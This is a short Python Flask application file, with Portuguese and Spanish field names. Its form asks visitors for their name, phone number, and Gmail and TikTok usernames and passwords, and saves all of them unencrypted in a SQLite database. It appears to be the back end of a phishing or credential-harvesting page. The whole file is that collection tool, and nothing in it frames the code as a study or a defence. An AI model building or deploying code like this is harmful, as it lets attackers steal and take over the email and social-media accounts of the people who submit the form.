from flask import Flask, render_template, request
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///dados.db"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)

class Usuario(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    nome = db.Column(db.String(100), nullable=False)
    telefone = db.Column(db.String(20), nullable=False)
    gmail_user = db.Column(db.String(100), nullable=False)
    gmail_senha = db.Column(db.String(100), nullable=False)
    tiktok_user = db.Column(db.String(100), nullable=False)
    tiktok_senha = db.Column(db.String(100), nullable=False)

with app.app_context():
    db.create_all()

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        nome = request.form.get("nombre")  # Corrigido nome do campo
        telefone = request.form.get("telefono")  # Corrigido nome do campo
        gmail_user = request.form.get("gmail_user")
        gmail_senha = request.form.get("gmail_senha")
        tiktok_user = request.form.get("tiktok_user")
        tiktok_senha = request.form.get("tiktok_senha")

        # 🚨 Verifica se os campos não estão vazios antes de salvar
        if not nome or not telefone or not gmail_user or not gmail_senha or not tiktok_user or not tiktok_senha:
            return "Erro: Todos os campos são obrigatórios!", 400

        novo_usuario = Usuario(
            nome=nome, telefone=telefone, gmail_user=gmail_user, gmail_senha=gmail_senha,
            tiktok_user=tiktok_user, tiktok_senha=tiktok_senha
        )
        db.session.add(novo_usuario)
        db.session.commit()

    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug=True)
